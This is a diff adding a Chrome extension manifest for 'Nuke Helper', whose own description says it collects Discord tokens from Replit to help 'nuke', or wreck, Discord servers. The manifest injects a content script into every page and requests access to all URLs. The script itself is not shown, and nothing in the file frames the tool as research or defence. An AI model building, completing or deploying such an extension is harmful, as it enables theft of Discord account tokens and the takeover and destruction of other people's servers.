@@ -1,0 +1,19 @@
+{
+  "manifest_version": 3,
+  "name": "Nuke Helper",
+  "version": "1.0",
+  "description": "gets discord tokens from replit to help nuke.",
+  "permissions": ["clipboardWrite"],
+  "host_permissions": ["<all_urls>"],
+  "action": {
+    "default_popup": "popup.html",
+    "default_title": "Nuke Helper"
+  },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"],
+      "run_at": "document_idle"
+    }
+  ]
+}
